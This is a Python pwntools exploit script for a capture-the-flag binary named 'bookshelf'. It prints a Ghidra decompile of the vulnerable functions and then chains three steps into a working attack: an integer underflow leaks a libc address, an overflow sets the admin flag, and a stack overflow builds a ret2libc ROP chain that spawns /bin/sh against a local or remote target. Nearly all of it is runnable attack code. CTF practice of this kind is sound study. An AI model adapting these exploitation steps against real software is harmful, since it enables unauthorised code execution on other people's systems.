#!/usr/bin/env python3


"""
Ghidra decompile

void adminBook(int param_1)

{
  char local_38 [48];
  
  if (param_1 == 0) {
    puts("\nUnauthorized access: admins only!\n");
  }
  else {
    puts(
        "\nYou\'re an admin so I trust that you will be responsible with writing this very special b ook..."
        );
    printf(" >> ");
    fgets(local_38,0x100,stdin);
    puts("Book saved!");
  }
  return;
}


void buyBook(void)

{
  char cVar1;
  int iVar2;
  
  puts("Want to buy an adventure on paperback?");
  puts("Here\'s what we have in stock");
  puts("======================================");
  printf("|Cash balance: $%u|\n",(ulong)cash);
  puts("1) The Catcher in the ROP - $300");
  puts("2) The Great Hacksby - $425");
  puts("3) The Address of puts() - $99999999");
  puts("======================================");
  printf("What do you want to read? >> ");
  iVar2 = getchar();
  cVar1 = (char)iVar2;
  if (cVar1 != '\n') {
    getchar();
  }
  if (cVar1 == '3') {
    if (cash < 99999999) {
      puts("You don\'t have enough cash!");
    }
    else {
      printf("In the realm of bits and bytes, the audacious CTF player searched and searched, seekin g something useful for their intellectual shenanigans. At long last, they had finally found it . For in the distance, in all it\'s glory %p rested in slumber, it\'s image telling a story. T he End.\n"
             ,puts);
    }
  }
  else {
    if ('3' < cVar1) {
LAB_00401543:
      puts("\nInvalid option!\n");
      buyBook();
      return;
    }
    if (cVar1 == '1') {
      if (cash < 300) {
        puts("You don\'t have enough cash!");
      }
      else {
        cash = cash - 300;
        puts(
            "A restless hacker named Holden Codefield discovered ROP and became obsessed with its po wer. He saw himself as a catcher in the ROP, navigating through memory addresses to seiz e control. His place in the world soon to reveal. The End."
            );
      }
    }
    else {
      if (cVar1 != '2') goto LAB_00401543;
      if (cash < 0x1a9) {
        puts("You don\'t have enough cash!");
      }
      else {
        cash = cash - 0x1a9;
        puts(
            "In the midst of the Roaring Twenties, extravagant parties corrupted Jay Gatsby\'s memor y. Even with corrupted memory, Gatsby sought to change his past, but realized he\'d neve r be able to find an exploit that rewrites the shattered dreams of lost love. The End."
            );
      }
    }
  }
  printf("\nThanks for you\'re buisness, would you like to leave a tip? (y/N) >> ");
  iVar2 = getchar();
  cVar1 = (char)iVar2;
  if (cVar1 != '\n') {
    getchar();
  }
  if ((cVar1 == 'Y') || (cVar1 == 'y')) {
    puts("\nYay! Thank you!");
    cash = cash - 10;
  }
  else {
    puts("\nOh... ok");
  }
  return;
}

void writeBook(char *book)
{
  int iVar1;
  char buffer [47];
  char user_choice;
  
  memset(book,0,0x28);
  puts("Always great to see aspiring authors!");
  printf("Is this book an audiobook? (y/N) >> ");
  iVar1 = getchar();
  user_choice = (char)iVar1;
  if (user_choice != '\n') {
    getchar();
  }
  if ((user_choice == 'y') || (user_choice == 'Y')) {
    *(undefined4 *)book = 0x29424128;
    *(undefined4 *)(book + 3) = 0x203a29;
  }
  printf("Please write your book (40 chars max) >> ");
  fgets(buffer,0x28,stdin);
  if ((user_choice == 'y') || (user_choice == 'Y')) {
    strcat(book,buffer);
  }
  else {
    strcpy(book,buffer);
  }
  puts("Book saved!");
  return;
}

main just calls the various functions based on user input.

Multiple vulnerabilities are needed to chain together to a ROP at the end.  
First, need to buy books and leave a tip, enabling an integer under flow 
which lets us buy the address of puts.  Using that we have libc so then we 
have to write a book and choose audiobook which adds 3 bytes of random data 
to our book buffer which lets us overflow into the admin check if we provide
38 bytes of data which lets us become admin and then the admin letâ€™s you do 
a buffer overflow which we can just do a ret2libc to get a shell
"""

from pwn import *


exe = ELF("./bookshelf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")

    # Step one: get libc leak
    payload = b'2\n2\ny\n'
    for x in range(8):
        r.send(payload)
    payload = b'2\n3\ny\n'
    r.send(payload)

    r.recvuntil(b'glory ')
    leak = int(r.recvuntil(b' ').decode("utf-8").split(' ')[0], 16)
    libc.address = leak - libc.sym['puts']
    log.progress("Libc address is ", hex(libc.address))

    # Step two: Get admin access
    payload = b'1\ny\n' + b'A'*38 + b'\n'
    r.send(payload)
    r.recvuntil (b'out')
    r.recvuntil (b'>>')

    # Step three: ret2libc
    payload = b'3\n'
    payload += b'A'*48

    rop = ROP(libc)
    log.progress("Finding gadgets")
    pop_rdi = rop.rdi.address
    system = libc.sym['system']
    log.progress("Libc system: ", hex(system))
    binsh = next(libc.search(b'/bin/sh'))
    log.progress("Libc binsh: ", hex(binsh))
    ret = rop.ret.address

    log.progress("Building ROP Chain")
    payload += p64(ret) + \
               p64(pop_rdi) + \
               p64(binsh) + \
               p64(ret) + \
               p64(system) + \
               b'\n'

    r.send(payload)
    # Receive twice to cleanup
    r.recvuntil(b'Book saved!')
    r.recvuntil(b'Book saved!')

    # Should have a shell now
    r.interactive()


if __name__ == "__main__":
    main()
